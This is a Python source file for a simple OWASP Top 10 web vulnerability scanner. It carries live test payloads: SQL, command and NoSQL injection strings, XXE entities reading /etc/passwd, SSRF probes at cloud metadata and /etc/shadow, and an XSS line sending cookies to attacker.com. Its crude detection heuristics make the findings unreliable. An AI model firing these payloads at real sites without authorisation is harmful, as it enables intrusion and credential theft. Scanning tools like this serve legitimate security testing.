import logging
import json
import requests
from urllib.parse import urlparse
import re

logging.basicConfig(level=logging.DEBUG)  # Ensure debug logging

class ZAPLiteScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        logging.debug(f"Initializing scanner for URL: {target_url}")
        self.api_key = None  # Optional: for authenticated scans
    
    def _validate_url(self):
        """Validate and normalize URL"""
        try:
            result = urlparse(self.target_url)
            is_valid = all([result.scheme, result.netloc])
            logging.debug(f"URL Validation: {is_valid}")
            return is_valid
        except Exception as e:
            logging.error(f"URL Validation Error: {e}")
            return False

    def scan(self):
        """Perform comprehensive vulnerability scanning aligned with OWASP Top 10 2021"""
        logging.info(f"Starting scan for {self.target_url}")
        
        if not self._validate_url():
            logging.error(f"Invalid URL format: {self.target_url}")
            return {'error': 'Invalid URL format'}

        try:
            # Perform all vulnerability checks
            all_checks = [
                ('A01:2021 - Broken Access Control', self._check_access_control),
                ('A02:2021 - Cryptographic Failures', self._check_crypto_failures),
                ('A03:2021 - Injection', self._check_injection),
                ('A04:2021 - Insecure Design', self._check_insecure_design),
                ('A05:2021 - Security Misconfiguration', self._check_headers),
                ('A06:2021 - Vulnerable Components', self._check_known_vulnerabilities),
                ('A07:2021 - Authentication & Access Failures', self._check_authentication),
                ('A08:2021 - Software & Data Integrity', self._check_data_integrity),
                ('A09:2021 - Security Logging Failures', self._check_logging),
                ('A10:2021 - Server-Side Request Forgery (SSRF)', self._check_ssrf)
            ]

            # Dictionary to store unique vulnerabilities
            unique_vulnerabilities = {}

            # Perform checks and collect unique vulnerabilities
            for category, check_func in all_checks:
                try:
                    vulnerabilities = check_func()
                    if vulnerabilities:
                        # Use a set to track unique vulnerability signatures
                        unique_issues = []
                        seen_signatures = set()

                        for vuln in vulnerabilities:
                            # Create a signature based on key vulnerability attributes
                            signature = hash(frozenset(vuln.items()))
                            
                            # Only add if not already seen
                            if signature not in seen_signatures:
                                unique_issues.append(vuln)
                                seen_signatures.add(signature)

                        # Store unique vulnerabilities for this category
                        if unique_issues:
                            unique_vulnerabilities[category] = unique_issues
                except Exception as e:
                    logging.error(f"Error in {category} check: {e}")

            logging.info(f"Scan completed for {self.target_url}. Vulnerabilities found: {len(unique_vulnerabilities)}")
            logging.debug(f"Detailed Results: {json.dumps(unique_vulnerabilities, indent=2)}")
            
            return unique_vulnerabilities
        
        except Exception as e:
            logging.error(f"Unexpected error during scan: {e}", exc_info=True)
            return {'error': str(e)}

    def _check_injection(self):
        """Comprehensive Injection Vulnerability Checks"""
        injection_tests = [
            # SQL Injection tests
            f"{self.target_url}/test?id=1' OR '1'='1",
            f"{self.target_url}/test?id=1 UNION SELECT username, password FROM users",
            
            # Command Injection tests
            f"{self.target_url}/test?cmd=$(whoami)",
            f"{self.target_url}/test?cmd=cat /etc/passwd",
            
            # XSS tests
            f"{self.target_url}/test?q=<script>alert('XSS')</script>",
            f"{self.target_url}/test?q=javascript:alert('XSS')",
            
            # NoSQL Injection tests
            f"{self.target_url}/test?user[$ne]=x",
            f"{self.target_url}/test?user[$regex]=.*"
        ]
        results = []

        for test_url in injection_tests:
            try:
                logging.debug(f"Testing injection for URL: {test_url}")
                
                # Try GET request
                response_get = requests.get(test_url, timeout=5)
                
                # Try POST request with payload
                response_post = requests.post(self.target_url, data={'payload': test_url}, timeout=5)
                
                # Check for injection indicators
                injection_indicators = [
                    'sql error', 'syntax error', 'undefined', 
                    'warning', 'error in your sql syntax', 
                    'uncaught exception', 'stack trace',
                    'root:', 'etc/passwd', 'command not found'
                ]
                
                # Check response texts
                get_text = response_get.text.lower()
                post_text = response_post.text.lower()
                
                # Detect various injection types
                if any(indicator in get_text or indicator in post_text for indicator in injection_indicators):
                    vuln_type = 'Potential Injection Vulnerability'
                    risk = 'High'
                    
                    # Determine specific injection type
                    if 'sql' in test_url.lower():
                        vuln_type = 'SQL Injection'
                    elif 'cmd' in test_url.lower():
                        vuln_type = 'Command Injection'
                    elif 'script' in test_url.lower():
                        vuln_type = 'Cross-Site Scripting (XSS)'
                    elif '$ne' in test_url or '$regex' in test_url:
                        vuln_type = 'NoSQL Injection'
                    
                    results.append({
                        'type': vuln_type,
                        'url': test_url,
                        'risk': risk,
                        'description': f'Potential {vuln_type} vulnerability detected',
                        'recommendation': 'Implement input validation, use parameterized queries, sanitize user inputs'
                    })
            except requests.RequestException as e:
                logging.warning(f"Injection check failed for {test_url}: {e}")

        return results

    def _check_xss(self):
        """Comprehensive Cross-Site Scripting (XSS) Checks"""
        xss_payloads = [
            # Reflected XSS
            f"{self.target_url}?q=<script>alert('XSS')</script>",
            f"{self.target_url}?q=<img src=x onerror=alert('XSS')>",
            
            # Stored XSS
            f"{self.target_url}/submit?comment=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            
            # DOM-based XSS
            f"{self.target_url}/#<script>alert('XSS')</script>",
            
            # HTML context XSS
            f"{self.target_url}?q=\"><script>alert('XSS')</script>",
            
            # JavaScript context XSS
            f"{self.target_url}?q=');alert('XSS');//"
        ]
        results = []

        for payload in xss_payloads:
            try:
                # Try GET request with payload
                response = requests.get(payload, timeout=5)
                
                # Check for XSS indicators in response
                if payload in response.text or 'XSS' in response.text:
                    results.append({
                        'type': 'Cross-Site Scripting (XSS)',
                        'url': payload,
                        'risk': 'High',
                        'description': 'Potential Cross-Site Scripting vulnerability detected',
                        'recommendation': 'Implement output encoding, use content security policy (CSP), validate and sanitize inputs'
                    })
            except requests.RequestException as e:
                logging.warning(f"XSS check failed: {e}")

        return results

    def _check_ssrf(self):
        """Comprehensive Server-Side Request Forgery (SSRF) Checks"""
        ssrf_payloads = [
            # Internal network access
            f"{self.target_url}?url=http://localhost",
            f"{self.target_url}?url=http://127.0.0.1",
            
            # Cloud metadata endpoints
            f"{self.target_url}?url=http://169.254.169.254/latest/meta-data/",
            f"{self.target_url}?url=http://169.254.169.254/latest/user-data/",
            
            # File access
            f"{self.target_url}?url=file:///etc/passwd",
            f"{self.target_url}?url=file:///etc/shadow",
            
            # Alternative protocols
            f"{self.target_url}?url=gopher://localhost:22",
            f"{self.target_url}?url=dict://localhost:11211"
        ]
        results = []

        for payload in ssrf_payloads:
            try:
                response = requests.get(payload, timeout=5)
                
                # Check for indicators of successful internal resource access
                ssrf_indicators = [
                    'root:', 'localhost', 'instance-id', 
                    'meta-data', 'user-data', 'etc/passwd',
                    'ssh', 'memcached'
                ]
                
                if response.status_code == 200 and any(
                    indicator.lower() in response.text.lower() 
                    for indicator in ssrf_indicators
                ):
                    results.append({
                        'type': 'Server-Side Request Forgery (SSRF)',
                        'url': payload,
                        'risk': 'Critical',
                        'description': 'Potential ability to make server-side requests to internal or restricted resources',
                        'recommendation': 'Implement strict URL validation, use allowlists, disable unnecessary URL fetching'
                    })
            except requests.RequestException as e:
                logging.warning(f"SSRF check failed: {e}")

        return results

    def _check_access_control(self):
        """Check for broken access control"""
        results = []
        access_tests = [
            f"{self.target_url}/admin",
            f"{self.target_url}/user/sensitive-data"
        ]

        for test_url in access_tests:
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code < 403:
                    results.append({
                        'type': 'Broken Access Control',
                        'risk': 'High',
                        'url': test_url,
                        'description': 'Potential unauthorized access to restricted resources',
                        'recommendation': 'Implement proper role-based access control, validate user permissions'
                    })
            except requests.RequestException as e:
                logging.warning(f"Access control check failed: {e}")

        return results

    def _check_deserialization(self):
        """Check for insecure deserialization"""
        results = []
        deserialization_payloads = [
            'O:8:"stdClass":1:{s:4:"test";s:4:"data";}',  # PHP serialized object
            'rO0ABXNyABRqYXZhLnNlY3VyaXR5LlByaXZz'  # Java serialized object
        ]

        for payload in deserialization_payloads:
            try:
                headers = {'Content-Type': 'application/x-php-serialized'}
                response = requests.post(self.target_url, data=payload, headers=headers, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Insecure Deserialization',
                        'risk': 'High',
                        'description': 'Potential remote code execution via deserialization',
                        'recommendation': 'Avoid deserialization of untrusted data, use safe deserialization libraries'
                    })
            except requests.RequestException as e:
                logging.warning(f"Deserialization check failed: {e}")

        return results

    def _check_known_vulnerabilities(self):
        """Check for known vulnerable components"""
        results = []
        
        # Comprehensive list of known vulnerable libraries and versions
        known_vulnerabilities = {
            # Web Frameworks
            'Django': ['<3.2', '<4.0'],
            'Flask': ['<2.1.0'],
            'Express.js': ['<4.17.0'],
            
            # JavaScript Libraries
            'jQuery': ['<3.6.0', '1.x', '2.x'],
            'Bootstrap': ['<5.2.0', '3.x', '4.x'],
            'Angular': ['<14.0.0'],
            'React': ['<18.0.0'],
            
            # Database Drivers
            'pymongo': ['<4.0.0'],
            'psycopg2': ['<2.9.0'],
            
            # Utility Libraries
            'lodash': ['<4.17.21'],
            'moment.js': ['<2.29.0']
        }

        try:
            response = requests.get(self.target_url, timeout=5)
            response_text = response.text.lower()

            for library, vulnerable_versions in known_vulnerabilities.items():
                if library.lower() in response_text:
                    for version in vulnerable_versions:
                        results.append({
                            'type': 'Known Vulnerable Component',
                            'library': library,
                            'risk': 'High',
                            'description': f'Potential use of known vulnerable version of {library}',
                            'recommendation': f'Update {library} to the latest secure version, currently vulnerable version: {version}'
                        })
        except requests.RequestException as e:
            logging.warning(f"Known vulnerabilities check failed: {e}")

        return results

    def _check_logging(self):
        """Check for insufficient logging and monitoring"""
        results = []
        logging_tests = [
            f"{self.target_url}/logs",
            f"{self.target_url}/admin/logs",
            f"{self.target_url}/system/logs"
        ]

        for test_url in logging_tests:
            try:
                response = requests.get(test_url, timeout=5)
                
                # Logging and monitoring indicators
                logging_indicators = [
                    'logging disabled', 'no logging', 
                    'log level: none', 'monitoring off'
                ]
                
                # Check for potential logging issues
                if response.status_code < 403 or any(
                    indicator in response.text.lower() 
                    for indicator in logging_indicators
                ):
                    results.append({
                        'type': 'Insufficient Logging',
                        'url': test_url,
                        'risk': 'Low',
                        'description': 'Potential lack of comprehensive security event logging',
                        'recommendation': 'Implement robust logging mechanisms, track and monitor security events, authentication attempts, and critical system changes'
                    })
            except requests.RequestException as e:
                logging.warning(f"Logging check failed: {e}")

        return results

    def _check_crypto_failures(self):
        """Check for potential cryptographic failures"""
        results = []
        try:
            response = requests.get(self.target_url, timeout=5)
            # Check for weak or outdated cryptographic mechanisms
            weak_crypto_indicators = [
                'md5', 'sha1', 'RC4', 'DES', 'weak encryption'
            ]
            
            for indicator in weak_crypto_indicators:
                if indicator.lower() in response.text.lower():
                    results.append({
                        'type': 'Weak Cryptographic Mechanism',
                        'risk': 'High',
                        'description': f'Potential use of weak cryptographic method: {indicator}',
                        'recommendation': 'Use strong, modern cryptographic algorithms (e.g., AES-256, SHA-256)'
                    })
        except requests.RequestException as e:
            logging.warning(f"Cryptographic failures check failed: {e}")
        
        return results

    def _check_insecure_design(self):
        """Check for potential insecure design patterns"""
        results = []
        insecure_design_tests = [
            # Debug and configuration exposure
            f"{self.target_url}/debug",
            f"{self.target_url}/admin/config",
            f"{self.target_url}/env",
            
            # Predictable resource locations
            f"{self.target_url}/backup",
            f"{self.target_url}/logs",
            
            # Overly permissive CORS
            f"{self.target_url}/api/data"
        ]

        for test_url in insecure_design_tests:
            try:
                response = requests.get(test_url, timeout=5)
                
                # Check for potential information disclosure
                insecure_indicators = [
                    'debug', 'config', 'environment', 
                    'secret', 'credentials', 'backup'
                ]
                
                # Check response status and content
                if response.status_code < 403 or any(
                    indicator in response.text.lower() 
                    for indicator in insecure_indicators
                ):
                    results.append({
                        'type': 'Insecure Design Exposure',
                        'url': test_url,
                        'risk': 'High',
                        'description': 'Potential exposure of sensitive configuration or debug information',
                        'recommendation': 'Remove or properly secure debug and administrative interfaces, implement strict access controls'
                    })
            except requests.RequestException as e:
                logging.warning(f"Insecure design check failed: {e}")

        return results

    def _check_data_integrity(self):
        """Check for software and data integrity issues"""
        results = []
        integrity_tests = [
            # Check for unverified updates
            f"{self.target_url}/update",
            f"{self.target_url}/upgrade",
            
            # Check for potential unsigned package indicators
            f"{self.target_url}/download",
            f"{self.target_url}/package"
        ]

        for test_url in integrity_tests:
            try:
                response = requests.get(test_url, timeout=5)
                
                # Integrity vulnerability indicators
                integrity_indicators = [
                    'unverified', 'unsigned', 'no checksum', 
                    'download without verification', 
                    'update without signature'
                ]
                
                # Check for potential integrity issues
                if any(
                    indicator in response.text.lower() 
                    for indicator in integrity_indicators
                ):
                    results.append({
                        'type': 'Software Integrity Vulnerability',
                        'url': test_url,
                        'risk': 'Medium',
                        'description': 'Potential lack of software or data integrity verification',
                        'recommendation': 'Implement digital signatures, checksums, and verified update mechanisms'
                    })
            except requests.RequestException as e:
                logging.warning(f"Data integrity check failed: {e}")

        return results

    def _check_sensitive_data(self):
        """Check for potential sensitive data exposure"""
        results = []
        try:
            response = requests.get(self.target_url, timeout=5)
            sensitive_patterns = [
                r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
                r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
                r'\b(?:\d{4}[-\s]?){3}\d{4}\b'  # Credit Card
            ]

            for pattern in sensitive_patterns:
                matches = re.findall(pattern, response.text)
                if matches:
                    results.append({
                        'type': 'Sensitive Data Exposure',
                        'risk': 'Critical',
                        'matches': matches,
                        'recommendation': 'Remove sensitive data from responses, use encryption'
                    })
        except requests.RequestException as e:
            logging.warning(f"Sensitive data check failed: {e}")

        return results

    def _check_xxe(self):
        """Check for XML External Entity vulnerabilities"""
        xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><test>&xxe;</test>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hosts">]><data>&file;</data>'
        ]
        results = []

        for payload in xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = requests.post(self.target_url, data=payload, headers=headers, timeout=5)
                if 'root:' in response.text or 'localhost' in response.text:
                    results.append({
                        'type': 'XML External Entity (XXE)',
                        'risk': 'Critical',
                        'description': 'Potential XXE vulnerability allowing file system access',
                        'recommendation': 'Disable XML external entity processing, use XML parsers that are not vulnerable'
                    })
            except requests.RequestException as e:
                logging.warning(f"XXE check failed: {e}")

        return results

    def _check_authentication(self):
        """Check for weak authentication mechanisms"""
        results = []
        weak_auth_tests = [
            f"{self.target_url}/login?username=admin&password=admin",
            f"{self.target_url}/login?username=test&password=test"
        ]

        for test_url in weak_auth_tests:
            try:
                response = requests.post(test_url, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Authentication',
                        'risk': 'High',
                        'description': 'Potential weak or default credentials',
                        'recommendation': 'Implement strong password policies, multi-factor authentication'
                    })
            except requests.RequestException as e:
                logging.warning(f"Authentication check failed: {e}")

        return results

    def _check_headers(self):
        """Comprehensive security headers check"""
        results = []
        try:
            # Try both HEAD and GET requests to capture different scenarios
            head_response = requests.head(self.target_url, timeout=5)
            get_response = requests.get(self.target_url, timeout=5)
            
            # Combine headers from both responses
            headers = {**head_response.headers, **get_response.headers}
            
            # Comprehensive security headers to check
            security_headers = {
                # Clickjacking protection
                'X-Frame-Options': {
                    'description': 'Missing clickjacking protection',
                    'recommendation': 'Add X-Frame-Options header with DENY or SAMEORIGIN value'
                },
                
                # XSS protection
                'X-XSS-Protection': {
                    'description': 'Missing XSS protection header',
                    'recommendation': 'Add X-XSS-Protection header with mode=block'
                },
                
                # MIME type sniffing prevention
                'X-Content-Type-Options': {
                    'description': 'Missing MIME type sniffing prevention',
                    'recommendation': 'Add X-Content-Type-Options header with nosniff value'
                },
                
                # HTTP Strict Transport Security
                'Strict-Transport-Security': {
                    'description': 'Missing HTTP Strict Transport Security',
                    'recommendation': 'Add Strict-Transport-Security header with appropriate max-age'
                },
                
                # Content Security Policy
                'Content-Security-Policy': {
                    'description': 'Missing Content Security Policy',
                    'recommendation': 'Implement a strict Content-Security-Policy to prevent XSS and data injection'
                },
                
                # Referrer Policy
                'Referrer-Policy': {
                    'description': 'Missing Referrer Policy',
                    'recommendation': 'Add Referrer-Policy header to control referrer information sent by browser'
                }
            }

            # Track found vulnerabilities
            for header, details in security_headers.items():
                # Case-insensitive header check
                if not any(h.lower() == header.lower() for h in headers):
                    results.append({
                        'type': 'Security Misconfiguration',
                        'header': header,
                        'risk': 'Medium',
                        'description': details['description'],
                        'recommendation': details['recommendation']
                    })

        except requests.RequestException as e:
            logging.warning(f"Headers check failed: {e}")

        return results

def run_zap_scan(target_url):
    """Lightweight ZAP-like scanner"""
    logging.info(f"Initiating ZAP-like scan for {target_url}")
    scanner = ZAPLiteScanner(target_url)
    return scanner.scan()
